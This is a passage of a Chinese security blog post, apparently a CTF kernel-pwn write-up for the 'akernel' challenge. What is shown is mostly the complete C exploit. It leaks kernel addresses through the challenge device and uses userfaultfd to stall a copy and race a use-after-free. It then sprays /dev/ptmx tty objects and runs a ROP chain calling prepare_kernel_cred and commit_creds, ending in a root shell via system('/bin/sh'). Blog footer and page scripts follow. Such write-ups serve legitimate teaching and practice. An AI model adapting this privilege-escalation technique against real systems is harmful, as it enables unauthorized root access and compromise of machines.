class="string">&quot;\033[31m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN printf(<span class="string">&quot;\033[36m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE printf(<span class="string">&quot;\033[34m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW printf(<span class="string">&quot;\033[33m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE printf(<span class="string">&quot;\033[35m&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span>* buf, <span class="type">size_t</span> size, <span class="type">long</span> <span class="type">long</span> base_addr = <span class="number">0</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33mDump:\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size / <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        ptr = buf + i * <span class="number">0x20</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx:   &quot;</span>, base_addr + i * <span class="number">0x20</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx &quot;</span>, *(<span class="type">long</span> <span class="type">long</span>*)(ptr + <span class="number">8</span> * j));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x20</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(ptr[j]) ? ptr[j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size % <span class="number">0x20</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> k = size - size % <span class="number">0x20</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx:   &quot;</span>, base_addr + k);</span><br><span class="line">        ptr = buf + k;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= (size - k) / <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%016llx &quot;</span>, *(<span class="type">long</span> <span class="type">long</span>*)(ptr + <span class="number">8</span> * i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span> - (size - k) / <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%19c&quot;</span>, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; size - k; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(ptr[j]) ? ptr[j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_sp, user_cs, user_ss, user_rflags, user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35mGetShell Success!\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_user_land</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs,cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)get_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mUser land saved.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34muser_ss:0x%llx\033[0m\n&quot;</span>, user_ss);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34muser_sp:0x%llx\033[0m\n&quot;</span>, user_sp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34muser_rflags:0x%llx\033[0m\n&quot;</span>, user_rflags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34muser_cs:0x%llx\033[0m\n&quot;</span>, user_cs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34muser_rip:0x%llx\033[0m\n&quot;</span>, user_rip);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> spray[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">long</span> save_pkr_not_offset = <span class="number">0x112e3c4</span>, save_cc_not_offset = <span class="number">0x1124af0</span>;</span><br><span class="line"><span class="type">long</span> kernel_entry = <span class="number">0xfffffe0000000000</span>, kernel_base, ko_save_addr, need_kernel_addr, ko_addr, ptr;</span><br><span class="line"><span class="type">sem_t</span> sem1, sem2, sem3;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span>* start, <span class="type">int</span> len, <span class="type">void</span>* handler)</span> &#123;</span><br><span class="line">    <span class="type">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    uffdio_register ur = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    uffdio_api ua = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ur.range.start = (ULL)start;</span><br><span class="line">    ur.range.len = len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    ioctl(uffd, UFFDIO_REGISTER, &amp;ur);</span><br><span class="line">    <span class="type">pthread_t</span> pt;</span><br><span class="line">    pthread_create(&amp;pt, <span class="literal">NULL</span>, (<span class="type">void</span>* (*)(<span class="type">void</span>*))handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UserfaultHandler</span><span class="params">(<span class="type">int</span> uffd)</span> &#123;</span><br><span class="line">    uffd_msg msg;</span><br><span class="line">    uffdio_copy uc = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* data = (<span class="type">unsigned</span> <span class="type">long</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0x11</span>;</span><br><span class="line">    data[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;</span><br><span class="line">    data[<span class="number">2</span>] = ptr;</span><br><span class="line">    data[<span class="number">3</span>] = ptr;</span><br><span class="line">    data[<span class="number">12</span>] = kernel_base + <span class="number">0xada33d</span>; <span class="comment">//push rdx; pop rsp; pop r13; ret;</span></span><br><span class="line">    data[idx++] = kernel_base + <span class="number">0x001518</span>;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">    data[idx++] = <span class="number">0</span>;</span><br><span class="line">    data[idx++] = need_kernel_addr + <span class="number">0x498e10</span>;<span class="comment">//prepare_kernel_cred</span></span><br><span class="line">    data[idx++] = kernel_base + <span class="number">0x000c66</span>;<span class="comment">//pop rbx; ret;</span></span><br><span class="line">    data[idx++] = <span class="number">0</span>;</span><br><span class="line">    data[idx++] = kernel_base + <span class="number">0x77508e</span>;<span class="comment">//mov rdi, rax; pop rbx; ret;</span></span><br><span class="line">    data[idx++] = <span class="number">0</span>;</span><br><span class="line">    data[idx++] = need_kernel_addr + <span class="number">0x4989d0</span>;<span class="comment">//commit_creds</span></span><br><span class="line">    data[idx++] = kernel_base + <span class="number">0x054422</span>;<span class="comment">//swapgs; ret;</span></span><br><span class="line">    data[idx++] = kernel_base + <span class="number">0x427f1b</span>;<span class="comment">//iretq; ret;</span></span><br><span class="line">    data[idx++] = user_rip;</span><br><span class="line">    data[idx++] = user_cs;</span><br><span class="line">    data[idx++] = user_rflags;</span><br><span class="line">    data[idx++] = user_sp;</span><br><span class="line">    data[idx++] = user_ss;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        pollfd pf = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        pf.fd = uffd;</span><br><span class="line">        pf.events = POLLIN;</span><br><span class="line">        poll(&amp;pf, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (msg.event &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Pass one event.&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Stage 1.&quot;</span>)</span>; CLOSE;</span><br><span class="line">        sem_post(&amp;sem1);</span><br><span class="line">        sem_wait(&amp;sem2);</span><br><span class="line">        RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Stage 2.&quot;</span>)</span>; CLOSE;</span><br><span class="line">        uc.src = (ULL)data;</span><br><span class="line">        uc.dst = msg.arg.pagefault.address &amp; ~(getpagesize() - <span class="number">1</span>);</span><br><span class="line">        uc.len = getpagesize();</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">        sem_post(&amp;sem3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">UAF</span><span class="params">()</span> &#123;</span><br><span class="line">    sem_wait(&amp;sem1);</span><br><span class="line">    ioctl(fd, <span class="number">0xFF01</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">    &#125;</span><br><span class="line">    sem_post(&amp;sem2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_user_land();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/akernel&quot;</span>, O_RDWR);</span><br><span class="line">    signal(SIGSEGV, (<span class="type">sighandler_t</span>)get_shell);</span><br><span class="line">    sem_init(&amp;sem1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem3, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0xFF00</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0xFF04</span>, kernel_entry + <span class="number">4</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(buf, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line">    kernel_base = *(<span class="type">long</span>*)buf - <span class="number">0x208e00</span>;</span><br><span class="line">    YELLOW <span class="title function_">printf</span><span class="params">(<span class="string">&quot;kernel base: 0x%lx&quot;</span>, kernel_base)</span>; CLOSE;</span><br><span class="line">    ko_save_addr = kernel_base + <span class="number">0x1407a98</span>;</span><br><span class="line">    ioctl(fd, <span class="number">0xFF04</span>, ko_save_addr);</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(buf, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line">    ko_addr = *(<span class="type">long</span>*)buf;</span><br><span class="line">    YELLOW <span class="title function_">printf</span><span class="params">(<span class="string">&quot;ko addr: 0x%lx&quot;</span>, ko_addr)</span>; CLOSE;</span><br><span class="line">    ioctl(fd, <span class="number">0xFF04</span>, kernel_base + <span class="number">0x114d0d8</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(buf, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line">    need_kernel_addr = *(<span class="type">long</span>*)buf;</span><br><span class="line">    YELLOW <span class="title function_">printf</span><span class="params">(<span class="string">&quot;need kernel addr: 0x%lx&quot;</span>, need_kernel_addr)</span>; CLOSE;</span><br><span class="line">    ioctl(fd, <span class="number">0xFF04</span>, ko_addr + <span class="number">0x2528</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(buf, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line">    ptr = *(<span class="type">long</span>*)buf;</span><br><span class="line">    YELLOW <span class="title function_">printf</span><span class="params">(<span class="string">&quot;ptr: 0x%lx&quot;</span>, ptr)</span>; CLOSE;</span><br><span class="line">    <span class="type">void</span>* <span class="built_in">map</span> = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(<span class="built_in">map</span>, <span class="number">0x1000</span>, (<span class="type">void</span>*)UserfaultHandler);</span><br><span class="line">    <span class="type">pthread_t</span> pt;</span><br><span class="line">    pthread_create(&amp;pt, <span class="literal">NULL</span>, (<span class="type">void</span>* (*)(<span class="type">void</span>*))UAF, <span class="literal">NULL</span>);</span><br><span class="line">    write(fd, <span class="built_in">map</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    sem_wait(&amp;sem3);</span><br><span class="line">    RED <span class="title function_">printf</span><span class="params">(<span class="string">&quot;Stage 3.&quot;</span>)</span>; CLOSE;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        ioctl(spray[i], <span class="number">0</span>, ptr + <span class="number">0x80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 从一道kernelpwn题了解userfaultfd机制的利用</li>
+        <li><strong>Author:</strong> 0rb1t</li>
+        <li><strong>Created at
+                :</strong> 2024-09-11 19:33:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-09-15 18:45:53
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/09/11/从一道kernelpwn题了解userfaultfd机制的利用/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/KernelPwn/">#KernelPwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/16/D-Link%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2022-26258%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">D-Link的命令注入漏洞CVE-2022-26258分析及复现</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">从一道kernelpwn题了解userfaultfd机制的利用</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0%EF%BC%9Aakernel"><span class="nav-text">题目名称：akernel</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">0rb1t</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
